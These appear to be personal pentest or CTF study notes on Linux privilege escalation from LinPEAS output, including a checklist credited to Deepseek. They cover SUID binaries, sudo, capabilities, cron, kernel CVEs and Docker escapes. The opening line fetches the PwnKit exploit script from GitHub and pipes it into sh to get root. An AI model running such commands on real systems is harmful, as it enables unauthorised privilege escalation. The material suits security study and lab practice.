If vulnerable to pwnkit: `sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"`

## look out for “Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d"
<details>
search vuln application with GTFOBins, scroll down to ‘sudo’ section
</details>

## Check files with interesting perms → SUID and SGID section. 
if section is empty run find / -perm -4000 2>/dev/null
<details>
Standard files that cannot be exploited:
<details>
Exceptions:
<details>
- **`sudo`**: If misconfigured (**`sudo -l`** allows running arbitrary commands).
- **`pkexec`**: If vulnerable to **CVE-2021-4034 (PwnKit)**.
- **`passwd`**: If you can manipulate **`/etc/passwd`** or environment variables.
</details>
| Binary | Why It's Usually Safe |
|--------|----------------------|
| ping | Drops privileges when run. |
| su | Legitimate use for switching users. |
| sudo | Requires password/configuration to escalate. |
| mount | Needs `root` or proper `/etc/fstab` entries. |
| umount | Same as `mount`. |
| passwd | Only allows changing the user's own password. |
| chsh | Only allows changing the user's own shell. |
| chfn | Only allows changing user info. |
| pkexec | Requires policykit rules (unless vulnerable to CVE-2021-4034). |
| gpasswd | Only manages group memberships (with restrictions). |
| newgrp | Only changes the effective group ID. |
| traceroute | Often drops privileges. |
| bsd-write | Only allows sending messages to other users. |
</details>
</details>
Other files which seem unexploitable from previous exercises: fusermount3

for anything else u find, go to gtfobins and look under ‘suid’ section

Deepseek's (more comprehensive) Guide
<details>
### **Quick Checklist for LinPEAS:**

1. **Check `sudo -l` (Can you run anything as root?)**
2. **Check SUID/SGID binaries (Can you abuse any?)**
3. **Check kernel version (Is it exploitable?)**
4. **Check writable system files (`/etc/passwd`, `/etc/sudoers`)**
5. **Check cron jobs (Any writable scripts?)**
6. **Check capabilities (Any dangerous `setuid` capabilities?)**
7. **Check processes (Any weird root processes?)**

### **1. High-Criticality Sections (Focus First)**

These sections often contain quick wins or severe misconfigurations:

- Look out for any exposed passwords in environment variables or config files. E.g. `AWS_SECRET_KEY` env variable or sth like that
- **CVE Checks**
    - Lists known vulnerabilities in the kernel/system (e.g., DirtyPipe, DirtyCow).
    - Look for **`[CVE-XXXX-XXXX]`** entries and check exploitability.
- **SUDO (sudo -l)**
    - Check if the current user can run any commands with **`sudo`** without a password.
    - Commands like **`sudo -l`** output may allow privilege escalation (e.g., **`sudo /bin/bash`**).
- **SUID/SGID Binaries**
    - Look for unusual SUID/SGID files (e.g., **`find / -perm -4000 2>/dev/null`**).
    - Common risky binaries: **`find`**, **`vim`**, **`bash`**, **`cp`**, **`nmap`**, **`python`**, **`perl`**.
- **Capabilities**
    - Binaries with dangerous capabilities (e.g., **`cap_setuid+ep`**).
    - Example: If **`/usr/bin/python`** has **`cap_setuid`**, it can escalate privileges.
- **Writable Files & Directories**
    - Check **writable system files** (**`/etc/passwd`**, **`/etc/sudoers`**, **`/etc/crontab`**).
    - Writable **cron jobs** (**`/etc/cron*`**, user crontabs).
- **Kernel Exploits (Kernel Version)**
    - Check kernel version (**`uname -a`**) against known exploits.
    - Use tools like **`searchsploit`** or **`linux-exploit-suggester`**.
- **Processes Running as Root**
    - Check for unusual processes running as root (**`ps aux | grep root`**).
    - Look for **weak service permissions** (e.g., a writable service file).

### **2. Medium-Criticality Sections (Check After)**

These may require more effort but can still lead to privilege escalation:

- **Cron Jobs**
    - Check for user-writable cron scripts (**`/var/spool/cron/crontabs/`**).
    - Look for wildcard injections in cron jobs.
- **Environment Variables ($PATH)**
    - Check if **`PATH`** includes writable directories (could hijack binaries).
- **NFS Shares**
    - If **`no_root_squash`** is enabled, you can create a SUID binary.
- **Docker / Container Escapes**
    - Check if inside a container (**`/.dockerenv`** exists).
    - Look for misconfigured Docker sockets (**`/var/run/docker.sock`**).
- **SSH Keys**
    - Check for private keys (**`~/.ssh/id_rsa`**, **`/etc/ssh/*`**).

### **3. Low-Criticality Sections (Last Check)**

These may provide useful info but are less likely to lead directly to root:

- **Mounted Filesystems (`mount`, `df -h`)**
    - Check for misconfigured permissions (**`noexec`**, **`nosuid`** missing).
- **Users & Groups**
    - Check for unexpected users in **`sudo`**/**`admin`** groups.
- **Network Information (Interfaces, ARP, Connections)**
    - May help in lateral movement but not direct priv esc.
- **Installed Software (dpkg -l, rpm -qa)**
    - Look for vulnerable versions of services (e.g., MySQL, Apache).
</details>